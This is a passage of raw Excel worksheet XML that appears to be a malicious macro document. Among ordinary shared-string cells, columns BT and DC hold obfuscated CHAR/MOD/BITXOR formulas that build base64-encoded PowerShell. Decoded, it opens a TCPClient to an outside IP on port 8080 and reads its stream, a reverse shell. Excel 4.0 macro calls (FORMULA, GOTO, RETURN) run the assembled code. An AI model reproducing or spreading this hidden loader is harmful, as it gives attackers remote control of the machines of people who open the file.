      </c>
      <c r="M92" t="s">
        <v>854</v>
      </c>
      <c r="AM92" t="s">
        <v>855</v>
      </c>
      <c r="AX92" t="s">
        <v>856</v>
      </c>
      <c r="BA92" t="s">
        <v>857</v>
      </c>
      <c r="BT92" t="s">
        <v>858</v>
      </c>
      <c r="CS92" t="s">
        <v>859</v>
      </c>
    </row>
    <row r="93" spans="1:106" x14ac:dyDescent="0.3">
      <c r="P93" t="s">
        <v>860</v>
      </c>
      <c r="AB93" t="s">
        <v>861</v>
      </c>
      <c r="AC93" t="s">
        <v>862</v>
      </c>
      <c r="AM93" t="s">
        <v>863</v>
      </c>
      <c r="BA93" t="s">
        <v>864</v>
      </c>
      <c r="BC93" t="s">
        <v>865</v>
      </c>
      <c r="BN93" t="s">
        <v>866</v>
      </c>
      <c r="BR93" t="s">
        <v>867</v>
      </c>
      <c r="CE93" t="s">
        <v>868</v>
      </c>
      <c r="CH93" t="s">
        <v>869</v>
      </c>
      <c r="CN93" t="s">
        <v>870</v>
      </c>
    </row>
    <row r="94" spans="1:106" x14ac:dyDescent="0.3">
      <c r="X94" t="s">
        <v>871</v>
      </c>
      <c r="AR94" t="s">
        <v>872</v>
      </c>
      <c r="BQ94" t="s">
        <v>873</v>
      </c>
      <c r="BU94" t="s">
        <v>874</v>
      </c>
      <c r="BX94" t="s">
        <v>875</v>
      </c>
      <c r="CS94" t="s">
        <v>876</v>
      </c>
    </row>
    <row r="95" spans="1:106" x14ac:dyDescent="0.3">
      <c r="F95" t="s">
        <v>877</v>
      </c>
      <c r="N95" t="s">
        <v>878</v>
      </c>
      <c r="X95" t="s">
        <v>879</v>
      </c>
      <c r="AN95" t="s">
        <v>880</v>
      </c>
      <c r="AO95" t="s">
        <v>881</v>
      </c>
      <c r="AR95" t="s">
        <v>882</v>
      </c>
      <c r="AU95" t="s">
        <v>883</v>
      </c>
      <c r="BR95" t="s">
        <v>884</v>
      </c>
      <c r="CI95" t="s">
        <v>885</v>
      </c>
      <c r="CM95" t="s">
        <v>886</v>
      </c>
      <c r="CU95" t="s">
        <v>887</v>
      </c>
      <c r="CX95" t="s">
        <v>888</v>
      </c>
    </row>
    <row r="96" spans="1:106" x14ac:dyDescent="0.3">
      <c r="E96" t="s">
        <v>889</v>
      </c>
      <c r="L96" t="s">
        <v>890</v>
      </c>
      <c r="R96" t="s">
        <v>891</v>
      </c>
      <c r="AE96" t="s">
        <v>892</v>
      </c>
      <c r="AL96" t="s">
        <v>893</v>
      </c>
      <c r="BF96" t="s">
        <v>894</v>
      </c>
      <c r="BH96" t="s">
        <v>895</v>
      </c>
      <c r="BM96" t="s">
        <v>896</v>
      </c>
      <c r="BW96" t="s">
        <v>897</v>
      </c>
      <c r="CF96" t="s">
        <v>898</v>
      </c>
    </row>
    <row r="97" spans="1:185" x14ac:dyDescent="0.3">
      <c r="V97" t="s">
        <v>899</v>
      </c>
      <c r="X97" t="s">
        <v>900</v>
      </c>
      <c r="AN97" t="s">
        <v>901</v>
      </c>
      <c r="BM97" t="s">
        <v>902</v>
      </c>
      <c r="CJ97" t="s">
        <v>903</v>
      </c>
    </row>
    <row r="98" spans="1:185" x14ac:dyDescent="0.3">
      <c r="A98" t="s">
        <v>904</v>
      </c>
      <c r="C98" t="s">
        <v>905</v>
      </c>
      <c r="E98" t="s">
        <v>906</v>
      </c>
      <c r="G98" t="s">
        <v>907</v>
      </c>
      <c r="N98" t="s">
        <v>908</v>
      </c>
      <c r="X98" t="s">
        <v>909</v>
      </c>
      <c r="Z98" t="s">
        <v>910</v>
      </c>
      <c r="AJ98" t="s">
        <v>911</v>
      </c>
      <c r="AL98" t="s">
        <v>912</v>
      </c>
      <c r="BW98" t="s">
        <v>913</v>
      </c>
      <c r="CD98" t="s">
        <v>914</v>
      </c>
      <c r="CR98" t="s">
        <v>915</v>
      </c>
    </row>
    <row r="99" spans="1:185" x14ac:dyDescent="0.3">
      <c r="G99" t="s">
        <v>916</v>
      </c>
      <c r="L99" t="s">
        <v>917</v>
      </c>
      <c r="N99" t="s">
        <v>918</v>
      </c>
      <c r="U99" t="s">
        <v>919</v>
      </c>
      <c r="BG99" t="s">
        <v>920</v>
      </c>
      <c r="BP99" t="s">
        <v>921</v>
      </c>
      <c r="BY99" t="s">
        <v>922</v>
      </c>
      <c r="CB99" t="s">
        <v>923</v>
      </c>
      <c r="CF99" t="s">
        <v>924</v>
      </c>
      <c r="CO99" t="s">
        <v>925</v>
      </c>
    </row>
    <row r="100" spans="1:185" x14ac:dyDescent="0.3">
      <c r="C100" t="s">
        <v>926</v>
      </c>
      <c r="D100" t="s">
        <v>927</v>
      </c>
      <c r="F100" t="s">
        <v>928</v>
      </c>
      <c r="O100" t="s">
        <v>929</v>
      </c>
      <c r="T100" t="s">
        <v>930</v>
      </c>
      <c r="BR100" t="s">
        <v>931</v>
      </c>
      <c r="BZ100" t="s">
        <v>932</v>
      </c>
      <c r="CZ100" t="s">
        <v>933</v>
      </c>
      <c r="DA100" t="s">
        <v>934</v>
      </c>
      <c r="DC100" t="str">
        <f>CONCATENATE(CHAR(MOD(454,389)),CHAR(78),CHAR(INT("65")),CHAR(66),MID("ogry0u",5,1),CHAR(MOD(610,545)),CHAR(72),CHAR(INT("81")),MID("wAddpl",2,1),CHAR(MOD(191,113)),CHAR(MOD(438,373)),CHAR(66),CHAR(MOD(518,412)),CHAR(_xlfn.BITXOR(790,855)))</f>
        <v>ANAB0AHQANABjA</v>
      </c>
    </row>
    <row r="101" spans="1:185" x14ac:dyDescent="0.3">
      <c r="D101" t="s">
        <v>935</v>
      </c>
      <c r="H101" t="s">
        <v>936</v>
      </c>
      <c r="AH101" t="s">
        <v>937</v>
      </c>
      <c r="BJ101" t="s">
        <v>938</v>
      </c>
      <c r="BT101" t="str">
        <f>CONCATENATE(CHAR(_xlfn.BITXOR(825,888)),CHAR(INT("85")),CHAR(65),CHAR(66),CHAR(68),CHAR(65),CHAR(MOD(596,525)),CHAR(_xlfn.BITXOR(181,194)),CHAR(65),CHAR(MOD(213,116)),CHAR(INT("81")),MID("Bnwnaj",1,1),CHAR(MOD(553,445)),CHAR(_xlfn.BITXOR(16,81)),MID("lmkjamGl",7,1),CHAR(MOD(387,335)))</f>
        <v>AUABDAGwAaQBlAG4</v>
      </c>
      <c r="CZ101" t="s">
        <v>939</v>
      </c>
      <c r="DC101" t="str">
        <f>CONCATENATE($DC$100)</f>
        <v>ANAB0AHQANABjA</v>
      </c>
    </row>
    <row r="102" spans="1:185" x14ac:dyDescent="0.3">
      <c r="A102" t="s">
        <v>940</v>
      </c>
      <c r="M102" t="s">
        <v>941</v>
      </c>
      <c r="AN102" t="s">
        <v>942</v>
      </c>
      <c r="AU102" t="s">
        <v>943</v>
      </c>
      <c r="BG102" t="s">
        <v>944</v>
      </c>
      <c r="BR102" t="s">
        <v>945</v>
      </c>
      <c r="BS102" t="s">
        <v>946</v>
      </c>
      <c r="BT102" t="str">
        <f>CONCATENATE(CHAR(_xlfn.BITXOR(337,272)),CHAR(MOD(492,392)),CHAR(65),CHAR(MOD(528,463)),CHAR(_xlfn.BITXOR(121,22)),CHAR(INT("65")),CHAR(67),CHAR(99),CHAR(65),CHAR(77),CHAR(_xlfn.BITXOR(461,412)),CHAR(65),CHAR(INT("48")),MID("eywAbb",4,1),CHAR(INT("68")),CHAR(99),CHAR(INT("65")),CHAR(_xlfn.BITXOR(784,860)))</f>
        <v>AdAAoACcAMQA0ADcAL</v>
      </c>
      <c r="BU102" t="s">
        <v>947</v>
      </c>
      <c r="BW102" t="s">
        <v>948</v>
      </c>
      <c r="CN102" t="s">
        <v>949</v>
      </c>
      <c r="CS102" t="s">
        <v>950</v>
      </c>
      <c r="CZ102" t="s">
        <v>951</v>
      </c>
      <c r="DC102" t="b">
        <f bx="1">part20=$DC$101</f>
        <v>0</v>
      </c>
    </row>
    <row r="103" spans="1:185" x14ac:dyDescent="0.3">
      <c r="K103" t="s">
        <v>952</v>
      </c>
      <c r="L103" t="s">
        <v>953</v>
      </c>
      <c r="AF103" t="s">
        <v>954</v>
      </c>
      <c r="AS103" t="s">
        <v>955</v>
      </c>
      <c r="BD103" t="s">
        <v>956</v>
      </c>
      <c r="BF103" t="s">
        <v>957</v>
      </c>
      <c r="BM103" t="s">
        <v>958</v>
      </c>
      <c r="BT103" t="str">
        <f>CONCATENATE(CHAR(MOD(482,379)),CHAR(65),CHAR(INT("120")),CHAR(65),CHAR(MOD(554,486)),CHAR(_xlfn.BITXOR(409,510)),CHAR(65),CHAR(INT("77")),CHAR(103),MID("ejyAab",4,1),CHAR(INT("117")),CHAR(INT("65")),CHAR(_xlfn.BITXOR(727,659)),CHAR(_xlfn.BITXOR(779,846)),CHAR(MOD(391,326)),CHAR(_xlfn.BITXOR(709,651)))</f>
        <v>gAxADgAMgAuADEAN</v>
      </c>
      <c r="CA103" t="s">
        <v>959</v>
      </c>
      <c r="CD103" t="s">
        <v>960</v>
      </c>
      <c r="CI103" t="s">
        <v>961</v>
      </c>
      <c r="CQ103" t="s">
        <v>962</v>
      </c>
      <c r="DC103" t="str">
        <f>CONCATENATE(CHAR(71),MID("sszk",1,1),CHAR(MOD(171,106)),CHAR(88),MID("twpps",2,1),CHAR(MOD(388,322)),CHAR(_xlfn.BITXOR(447,488)),CHAR(INT("65")),MID("Dxbh",1,1),CHAR(_xlfn.BITXOR(632,565)),CHAR(65),MID("vmaYtqy",4,1),CHAR(119),CHAR(_xlfn.BITXOR(7,69)),CHAR(INT("48")),CHAR(MOD(196,131)))</f>
        <v>GsAXwBWADMAYwB0A</v>
      </c>
    </row>
    <row r="104" spans="1:185" x14ac:dyDescent="0.3">
      <c r="A104" t="s">
        <v>963</v>
      </c>
      <c r="O104" t="s">
        <v>964</v>
      </c>
      <c r="AJ104" t="s">
        <v>965</v>
      </c>
      <c r="AQ104" t="s">
        <v>966</v>
      </c>
      <c r="AU104" t="s">
        <v>967</v>
      </c>
      <c r="BA104" t="s">
        <v>968</v>
      </c>
      <c r="BT104" t="str">
        <f>CONCATENATE($BT$101,$BT$102,$BT$103)</f>
        <v>AUABDAGwAaQBlAG4AdAAoACcAMQA0ADcALgAxADgAMgAuADEAN</v>
      </c>
      <c r="BX104" t="s">
        <v>969</v>
      </c>
      <c r="CN104" t="s">
        <v>970</v>
      </c>
      <c r="DC104" t="str">
        <f>CONCATENATE($DC$103)</f>
        <v>GsAXwBWADMAYwB0A</v>
      </c>
      <c r="GC104" t="b">
        <f>FORMULA($DC$57,$H$111)</f>
        <v>0</v>
      </c>
    </row>
    <row r="105" spans="1:185" x14ac:dyDescent="0.3">
      <c r="R105" t="s">
        <v>971</v>
      </c>
      <c r="S105" t="s">
        <v>972</v>
      </c>
      <c r="W105" t="s">
        <v>973</v>
      </c>
      <c r="AA105" t="s">
        <v>974</v>
      </c>
      <c r="AB105" t="s">
        <v>975</v>
      </c>
      <c r="AD105" t="s">
        <v>976</v>
      </c>
      <c r="AG105" t="s">
        <v>977</v>
      </c>
      <c r="AL105" t="s">
        <v>978</v>
      </c>
      <c r="AQ105" t="s">
        <v>979</v>
      </c>
      <c r="BB105" t="s">
        <v>980</v>
      </c>
      <c r="BQ105" t="s">
        <v>981</v>
      </c>
      <c r="BT105" t="b">
        <f bx="1">part4=$BT$104</f>
        <v>0</v>
      </c>
      <c r="CI105" t="s">
        <v>982</v>
      </c>
      <c r="CK105" t="s">
        <v>983</v>
      </c>
      <c r="DA105" t="s">
        <v>984</v>
      </c>
      <c r="DC105" t="b">
        <f bx="1">part21=$DC$104</f>
        <v>0</v>
      </c>
      <c r="GC105" t="b">
        <f>GOTO($AC$55)</f>
        <v>0</v>
      </c>
    </row>
    <row r="106" spans="1:185" x14ac:dyDescent="0.3">
      <c r="T106" t="s">
        <v>985</v>
      </c>
      <c r="AF106" t="s">
        <v>986</v>
      </c>
      <c r="AR106" t="s">
        <v>987</v>
      </c>
      <c r="AW106" t="s">
        <v>988</v>
      </c>
      <c r="AY106" t="s">
        <v>989</v>
      </c>
      <c r="AZ106" t="s">
        <v>990</v>
      </c>
      <c r="BA106" t="s">
        <v>991</v>
      </c>
      <c r="BE106" t="s">
        <v>992</v>
      </c>
      <c r="BK106" t="s">
        <v>993</v>
      </c>
      <c r="BT106" t="str">
        <f>CONCATENATE(CHAR(INT("119")),CHAR(MOD(184,119)),CHAR(INT("121")),CHAR(INT("65")),CHAR(MOD(355,288)),CHAR(_xlfn.BITXOR(63,11)),CHAR(MOD(242,177)),CHAR(77),CHAR(81),CHAR(MOD(597,532)),MID("kwjz4",5,1),CHAR(INT("65")),CHAR(68),CHAR(INT("107")),CHAR(_xlfn.BITXOR(272,337)),CHAR(_xlfn.BITXOR(418,488)))</f>
        <v>wAyAC4AMQA4ADkAJ</v>
      </c>
      <c r="BY106" t="s">
        <v>994</v>
      </c>
      <c r="CU106" t="s">
        <v>995</v>
      </c>
      <c r="CZ106" t="s">
        <v>996</v>
      </c>
      <c r="DC106" t="str">
        <f>CONCATENATE(CHAR(INT("68")),CHAR(_xlfn.BITXOR(14,79)),CHAR(INT("65")),CHAR(_xlfn.BITXOR(852,823)),CHAR(MOD(284,181)),CHAR(_xlfn.BITXOR(16,82)),CHAR(_xlfn.BITXOR(5,99)),CHAR(MOD(648,583)),CHAR(69),CHAR(77),CHAR(INT("65")),CHAR(INT("78")),CHAR(MOD(578,513)),CHAR(_xlfn.BITXOR(346,280)),MID("qrptejn",4,1))</f>
        <v>DAAcgBfAEMANABt</v>
      </c>
      <c r="GC106" t="b">
        <f>RETURN()</f>
        <v>0</v>
      </c>
    </row>
    <row r="107" spans="1:185" x14ac:dyDescent="0.3">
      <c r="S107" t="s">
        <v>997</v>
      </c>
      <c r="AI107" t="s">
        <v>998</v>
      </c>
      <c r="AT107" t="s">
        <v>999</v>
      </c>
      <c r="AU107" t="s">
        <v>1000</v>
      </c>
      <c r="BT107" t="str">
        <f>CONCATENATE(MID("jjbrwrxi",5,1),CHAR(_xlfn.BITXOR(407,470)),CHAR(115),CHAR(65),CHAR(_xlfn.BITXOR(436,496)),CHAR(_xlfn.BITXOR(737,646)),CHAR(_xlfn.BITXOR(582,519)),CHAR(77),CHAR(_xlfn.BITXOR(887,822)),CHAR(INT("65")),CHAR(_xlfn.BITXOR(558,538)),CHAR(MOD(636,571)),MID("wbDs",3,1),CHAR(_xlfn.BITXOR(963,898)))</f>
        <v>wAsADgAMAA4ADA</v>
      </c>
      <c r="CG107" t="s">
        <v>1001</v>
      </c>
      <c r="CM107" t="s">
        <v>1002</v>
      </c>
      <c r="CO107" t="s">
        <v>1003</v>
      </c>
      <c r="DC107" t="str">
        <f>CONCATENATE(CHAR(MOD(579,514)),CHAR(_xlfn.BITXOR(377,317)),CHAR(MOD(226,149)),CHAR(MOD(435,370)))</f>
        <v>ADMA</v>
      </c>
    </row>
    <row r="108" spans="1:185" x14ac:dyDescent="0.3">
      <c r="AJ108" t="s">
        <v>1004</v>
      </c>
      <c r="AS108" t="s">
        <v>1005</v>
      </c>
      <c r="AU108" t="s">
        <v>1006</v>
      </c>
      <c r="BI108" t="s">
        <v>1007</v>
      </c>
      <c r="BN108" t="s">
        <v>1008</v>
      </c>
      <c r="BT108" t="str">
        <f>CONCATENATE(CHAR(_xlfn.BITXOR(306,371)),CHAR(_xlfn.BITXOR(791,860)),CHAR(81),CHAR(MOD(604,539)),CHAR(MOD(543,488)),CHAR(_xlfn.BITXOR(78,15)),CHAR(INT("67")),MID("iQlwuf",2,1),MID("Aobfy",1,1),CHAR(MOD(579,480)),CHAR(119),MID("ouykBypw",5,1),CHAR(48),CHAR(65),CHAR(INT("72")),CHAR(INT("73")))</f>
        <v>AKQA7ACQAcwB0AHI</v>
      </c>
      <c r="CD108" t="s">
        <v>1009</v>
      </c>
      <c r="CU108" t="s">
        <v>1010</v>
      </c>
      <c r="DC108" t="str">
        <f>CONCATENATE($DC$106,$DC$107)</f>
        <v>DAAcgBfAEMANABtADMA</v>
      </c>
    </row>
    <row r="109" spans="1:185" x14ac:dyDescent="0.3">
      <c r="O109" t="s">
        <v>1011</v>
      </c>
      <c r="Q109" t="s">
        <v>1012</v>
      </c>
      <c r="T109" t="s">
        <v>1013</v>
      </c>
      <c r="X109" t="s">
        <v>1014</v>
      </c>
      <c r="AH109" t="s">
        <v>1015</v>
      </c>
      <c r="AQ109" t="s">
        <v>1016</v>
      </c>
      <c r="AT109" t="s">
        <v>1017</v>
      </c>
      <c r="AU109" t="s">
        <v>1018</v>
      </c>
      <c r="BT109" t="str">
        <f>CONCATENATE(CHAR(_xlfn.BITXOR(458,395)),MID("ylZnbj",3,1),CHAR(INT("81")),CHAR(66),CHAR(_xlfn.BITXOR(334,294)),CHAR(INT("65")),MID("Ggrb",1,1),CHAR(48),CHAR(INT("65")),MID("evzxpdwwI",9,1),CHAR(_xlfn.BITXOR(334,271)),CHAR(MOD(364,299)),CHAR(_xlfn.BITXOR(536,545)))</f>
        <v>AZQBhAG0AIAA9</v>
      </c>
      <c r="DC109" t="b">
        <f bx="1">part22=$DC$108</f>
        <v>0</v>
      </c>
    </row>
    <row r="110" spans="1:185" x14ac:dyDescent="0.3">
      <c r="K110" t="s">
        <v>1019</v>
      </c>
      <c r="U110" t="s">
        <v>1020</v>
      </c>
      <c r="Z110" t="s">
        <v>1021</v>
      </c>
      <c r="AO110" t="s">
        <v>1022</v>
      </c>
      <c r="AU110" t="s">
        <v>1023</v>
      </c>
      <c r="AV110" t="s">
        <v>1024</v>
      </c>
      <c r="AX110" t="s">
        <v>1025</v>
      </c>
      <c r="BT110" t="str">
        <f>CONCATENATE($BT$106,$BT$107,$BT$108,$BT$109)</f>
        <v>wAyAC4AMQA4ADkAJwAsADgAMAA4ADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9</v>
      </c>
      <c r="CC110" t="s">
        <v>1026</v>
      </c>
      <c r="CS110" t="s">
        <v>1027</v>
      </c>
      <c r="DC110" t="str">
        <f>CONCATENATE(CHAR(MOD(307,219)),CHAR(MOD(410,291)),CHAR(_xlfn.BITXOR(652,718)),CHAR(INT("109")),CHAR(MOD(331,266)),CHAR(_xlfn.BITXOR(607,535)),CHAR(INT("73")),MID("otgxkAwhs",6,1),CHAR(MOD(383,306)),CHAR(_xlfn.BITXOR(42,107)),CHAR(INT("66")),CHAR(MOD(588,472)),CHAR(MOD(283,218)),CHAR(INT("70")))</f>
        <v>XwBmAHIAMABtAF</v>
      </c>
    </row>
    <row r="111" spans="1:185" x14ac:dyDescent="0.3">
      <c r="B111" t="s">
        <v>1028</v>
      </c>
      <c r="K111" t="s">
        <v>1029</v>
      </c>
      <c r="M111" t="s">
        <v>1030</v>
      </c>
      <c r="N111" t="s">
        <v>1031</v>
      </c>
      <c r="P111" t="s">
        <v>1032</v>
      </c>
      <c r="Y111" t="s">
        <v>1033</v>
      </c>
      <c r="AC111" t="s">
        <v>1034</v>
      </c>
      <c r="AG111" t="s">
        <v>1035</v>
      </c>
      <c r="AP111" t="s">
        <v>1036</v>
      </c>
      <c r="AU111" t="s">
        <v>1037</v>
      </c>
      <c r="BA111" t="s">
        <v>1038</v>
      </c>
      <c r="BG111" t="s">
        <v>1039</v>
      </c>
      <c r="BN111" t="s">
        <v>1040</v>
      </c>
      <c r="BO111" t="s">
        <v>1041</v>
      </c>
      <c r="BT111" t="b">
        <f bx="1">part5=$BT$110</f>
        <v>0</v>
      </c>
      <c r="CD111" t="s">
        <v>1042</v>
      </c>
      <c r="CG111" t="s">
        <v>1043</v>
      </c>
      <c r="CQ111" t="s">
        <v>1044</v>
      </c>
      <c r="DC111" t="str">
        <f>CONCATENATE(CHAR(56),CHAR(_xlfn.BITXOR(887,822)),CHAR(INT("100")),CHAR(INT("65")),CHAR(MOD(623,557)),CHAR(INT("111")),CHAR(65))</f>
        <v>8AdABoA</v>
      </c>
    </row>
    <row r="112" spans="1:185" x14ac:dyDescent="0.3">
      <c r="B112" t="s">
        <v>1045</v>
      </c>
      <c r="H112" t="b">
        <f>RETURN()</f>
        <v>0</v>
      </c>
      <c r="AN112" t="s">
        <v>1046</v>
      </c>
      <c r="AR112" t="s">
        <v>1047</v>
      </c>
      <c r="BE112" t="s">
        <v>1048</v>
      </c>
      <c r="BR112" t="s">
        <v>1049</v>
      </c>
      <c r="BT112" t="str">
        <f>CONCATENATE(CHAR(65),CHAR(INT("67")),CHAR(MOD(423,358)),CHAR(INT("65")),CHAR(MOD(577,503)),MID("dsnzxA",6,1),CHAR(INT("66")),CHAR(MOD(443,337)),CHAR(INT("65")),CHAR(INT("71")),CHAR(_xlfn.BITXOR(259,372)),CHAR(65),MID("slqaaha",5,1),MID("kdQlx",3,1),CHAR(66),CHAR(108),CHAR(MOD(664,599)))</f>
        <v>ACAAJABjAGwAaQBlA</v>
      </c>
      <c r="BW112" t="s">
        <v>1050</v>
      </c>
      <c r="CE112" t="s">
        <v>1051</v>
      </c>
      <c r="CU112" t="s">
        <v>1052</v>
      </c>
      <c r="DC112" t="str">
        <f>CONCATENATE($DC$110,$DC$111)</f>
        <v>XwBmAHIAMABtAF8AdABoA</v>
      </c>
    </row>
    <row r="113" spans="2:107" x14ac:dyDescent="0.3">
      <c r="B113" t="s">
        <v>1053</v>
      </c>
      <c r="O113" t="s">
        <v>1054</v>
      </c>
      <c r="V113" t="s">
        <v>1055</v>
      </c>
      <c r="W113" t="s">
        <v>1056</v>
      </c>
      <c r="AL113" t="s">
        <v>1057</v>
      </c>
      <c r="BR113" t="s">
        <v>1058</v>
      </c>
      <c r="BT113" t="str">
        <f>CONCATENATE(CHAR(MOD(430,359)),CHAR(_xlfn.BITXOR(24,44)),CHAR(65),CHAR(_xlfn.BITXOR(461,425)),CHAR(INT("65")),CHAR(65),MID("myeuxuzw",4,1),CHAR(65),CHAR(69),CHAR(INT("99")),MID("onAiqmlh",3,1),MID("qmZfud",3,1),CHAR(_xlfn.BITXOR(596,517)),MID("samBbzhx",4,1),CHAR(MOD(604,556)),MID("mskA",4,1))</f>
        <v>G4AdAAuAEcAZQB0A</v>
      </c>
      <c r="CG113" t="s">
        <v>1059</v>
      </c>
      <c r="CU113" t="s">
        <v>1060</v>
      </c>
      <c r="DC113" t="b">
        <f bx="1">part23=$DC$112</f>
        <v>0</v>
      </c>
    </row>
    <row r="114" spans="2:107" x14ac:dyDescent="0.3">
      <c r="E114" t="s">
        <v>1061</v>
      </c>
      <c r="F114" t="s">
        <v>1062</v>
      </c>
      <c r="AA114" t="s">
        <v>1063</v>
      </c>
      <c r="AR114" t="s">
        <v>1064</v>
      </c>
      <c r="BJ114" t="s">
        <v>1065</v>
      </c>
      <c r="BT114" t="str">
        <f>CONCATENATE(CHAR(MOD(452,382)),CHAR(77),MID("iihqgA",6,1),CHAR(INT("100")),MID("hnzA",4,1),CHAR(66),CHAR(121),CHAR(65),CHAR(_xlfn.BITXOR(1007,936)),CHAR(INT("85")),CHAR(65),MID("Yqyfx",1,1),CHAR(INT("81")),CHAR(MOD(176,110)),CHAR(116),CHAR(MOD(322,257)),MID("pkpetrCyd",7,1))</f>
        <v>FMAdAByAGUAYQBtAC</v>
      </c>
      <c r="BU114" t="s">
        <v>1066</v>
      </c>
      <c r="CA114" t="s">
        <v>1067</v>
      </c>
      <c r="CC114" t="s">
        <v>1068</v>
      </c>
      <c r="CT114" t="s">
        <v>1069</v>
      </c>
      <c r="DC114" t="str">
        <f>CONCATENATE(CHAR(_xlfn.BITXOR(564,624)),CHAR(_xlfn.BITXOR(95,18)),CHAR(INT("65")),CHAR(_xlfn.BITXOR(656,712)),CHAR(MOD(643,524)),MID("bulBnujt",4,1),CHAR(_xlfn.BITXOR(1009,902)),MID("zhAzeawh",3,1),MID("ekncyDmy",6,1),CHAR(INT("81")),CHAR(_xlfn.BITXOR(707,642)),CHAR(_xlfn.BITXOR(396,495)),CHAR(_xlfn.BITXOR(412,491)))</f>
        <v>DMAXwBwADQAcw</v>
      </c>
    </row>
    <row r="115" spans="2:107" x14ac:dyDescent="0.3">
      <c r="K115" t="s">
        <v>1070</v>
      </c>
      <c r="M115" t="s">
        <v>1071</v>
      </c>
      <c r="V115" t="s">
        <v>1072</v>
      </c>
      <c r="AJ115" t="s">
        <v>1073</v>
      </c>
      <c r="AM115" t="s">
        <v>1074</v>
      </c>
      <c r="BM115" t="s">
        <v>1075</v>
      </c>
      <c r="BT115" t="str">
        <f>CONCATENATE(CHAR(_xlfn.BITXOR(695,720)),MID("ympAlau",4,1),CHAR(75),CHAR(_xlfn.BITXOR(594,515)),CHAR(INT("65")),CHAR(_xlfn.BITXOR(573,522)),CHAR(MOD(615,550)),MID("Fzxkwk",1,1),CHAR(115),MID("oAev",2,1))</f>
        <v>gAKQA7AFsA</v>
      </c>
      <c r="BU115" t="s">
        <v>1076</v>
      </c>
      <c r="BW115" t="s">
        <v>1077</v>
      </c>
      <c r="BX115" t="s">
        <v>1078</v>
      </c>
      <c r="CB115" t="s">
        <v>1079</v>
      </c>
      <c r="CE115" t="s">
        <v>1080</v>
      </c>
      <c r="CI115" t="s">
        <v>1081</v>
      </c>
      <c r="CO115" t="s">
        <v>1082</v>
      </c>
      <c r="DC115" t="str">
        <f>CONCATENATE(CHAR(INT("66")),CHAR(INT("48")),CHAR(INT("65")),CHAR(INT("72")),CHAR(MOD(211,163)),CHAR(65),MID("astruxIpq",7,1),CHAR(103),CHAR(MOD(276,211)),CHAR(MOD(174,119)),MID("jkhjApf",5,1),CHAR(67),CHAR(INT("81")),CHAR(65),CHAR(MOD(671,572)),CHAR(MOD(552,433)))</f>
        <v>B0AH0AIgA7ACQAcw</v>
      </c>
    </row>
    <row r="116" spans="2:107" x14ac:dyDescent="0.3">
      <c r="BB116" t="s">
        <v>1083</v>
      </c>
      <c r="BK116" t="s">
        <v>1084</v>
      </c>
      <c r="BT116" t="str">
        <f>CONCATENATE($BT$112,$BT$113,$BT$114,$BT$115)</f>
        <v>ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsA</v>
      </c>
      <c r="BV116" t="s">
        <v>1085</v>
      </c>
      <c r="BX116" t="s">
        <v>1086</v>
      </c>
      <c r="BZ116" t="s">
        <v>1087</v>
      </c>
      <c r="CU116" t="s">
        <v>1088</v>
      </c>
      <c r="DC116" t="str">
        <f>CONCATENATE(CHAR(_xlfn.BITXOR(849,787)),CHAR(108),MID("Aikskos",1,1),MID("lGcsox",2,1),CHAR(MOD(284,232)),CHAR(_xlfn.BITXOR(85,20)),CHAR(INT("90")),CHAR(65),MID("Bzoxwep",1,1),MID("inij",1,1),MID("ktydrbAb",7,1),CHAR(INT("72")),MID("ggcdtvik",8,1),CHAR(_xlfn.BITXOR(369,304)),CHAR(INT("100")))</f>
        <v>BlAG4AZABiAHkAd</v>
      </c>
    </row>
    <row r="117" spans="2:107" x14ac:dyDescent="0.3">
      <c r="R117" t="s">
        <v>1089</v>
      </c>
      <c r="X117" t="s">
        <v>1090</v>
      </c>
      <c r="AR117" t="s">
        <v>1091</v>
      </c>
      <c r="BE117" t="s">
        <v>1092</v>
      </c>
      <c r="BR117" t="s">
        <v>1093</v>
      </c>
      <c r="BT117" t="b">
        <f bx="1">part6=$BT$116</f>
        <v>0</v>
      </c>
      <c r="BV117" t="s">
        <v>1094</v>
      </c>
      <c r="CB117" t="s">
        <v>1095</v>
      </c>
      <c r="DC117" t="str">
        <f>CONCATENATE(MID("izuqAeebt",5,1),CHAR(MOD(264,198)),CHAR(INT("108")),MID("ggvolsyvA",9,1),CHAR(MOD(452,385)),CHAR(MOD(182,117)),CHAR(MOD(223,158)),CHAR(80),CHAR(_xlfn.BITXOR(570,619)),CHAR(MOD(613,548)),CHAR(INT("103")),CHAR(MOD(476,411)),CHAR(MOD(194,127)),MID("yrisvhgar",7,1),CHAR(65))</f>
        <v>ABlACAAPQAgACgA</v>
      </c>
    </row>
    <row r="118" spans="2:107" x14ac:dyDescent="0.3">
      <c r="B118" t="s">
        <v>1096</v>
      </c>
      <c r="H118" t="s">
        <v>1097</v>
      </c>
      <c r="K118" t="s">
        <v>1098</v>
      </c>
      <c r="AG118" t="s">
        <v>1099</v>
      </c>
      <c r="AH118" t="s">
        <v>1100</v>
      </c>
      <c r="AT118" t="s">
        <v>1101</v>
      </c>
      <c r="AY118" t="s">
        <v>1102</v>
      </c>
      <c r="AZ118" t="s">
        <v>1103</v>
      </c>
      <c r="BB118" t="s">
        <v>1104</v>
      </c>
      <c r="BO118" t="s">
        <v>1105</v>
      </c>
      <c r="BT118" t="str">
        <f>CONCATENATE(CHAR(INT("89")),MID("hcgtyc",3,1),CHAR(INT("66")),CHAR(53),CHAR(65),CHAR(MOD(359,287)),CHAR(MOD(262,181)),CHAR(MOD(496,431)),CHAR(_xlfn.BITXOR(362,304)),CHAR(81),CHAR(66),CHAR(98),CHAR(_xlfn.BITXOR(407,470)),MID("vflwFlv",5,1),CHAR(INT("48")),CHAR(_xlfn.BITXOR(690,755)),CHAR(88))</f>
        <v>YgB5AHQAZQBbAF0AX</v>
      </c>
      <c r="CN118" t="s">
        <v>1106</v>
      </c>
      <c r="CT118" t="s">
        <v>1107</v>
      </c>
      <c r="CY118" t="s">
        <v>1108</v>
      </c>
      <c r="CZ118" t="s">
        <v>1109</v>
      </c>
      <c r="DC118" t="str">
        <f>CONCATENATE($DC$114,$DC$115,$DC$116,$DC$117)</f>
        <v>DMAXwBwADQAcwB0AH0AIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgA</v>
      </c>
    </row>
    <row r="119" spans="2:107" x14ac:dyDescent="0.3">
      <c r="B119" t="s">
        <v>1110</v>
      </c>
      <c r="AO119" t="s">
        <v>1111</v>
      </c>
      <c r="BH119" t="s">
        <v>1112</v>
